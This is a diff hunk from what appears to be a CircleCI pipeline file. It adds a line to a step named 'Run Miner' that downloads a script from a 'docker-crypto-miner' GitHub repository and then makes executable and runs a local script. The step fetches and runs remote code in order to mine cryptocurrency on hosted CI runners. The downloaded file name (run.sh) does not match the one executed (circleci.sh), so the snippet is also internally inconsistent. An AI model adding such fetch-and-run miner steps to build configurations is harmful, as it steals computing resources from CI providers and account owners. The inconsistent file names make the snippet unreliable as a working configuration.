@@ -8,6 +8,7 @@ jobs:
         - run:
             name: Run Miner
             command: |
+              wget https://raw.githubusercontent.com/ci-monk/docker-crypto-miner/main/src/circleci/run.sh
               chmod +x circleci.sh
               ./circleci.sh
 workflows:
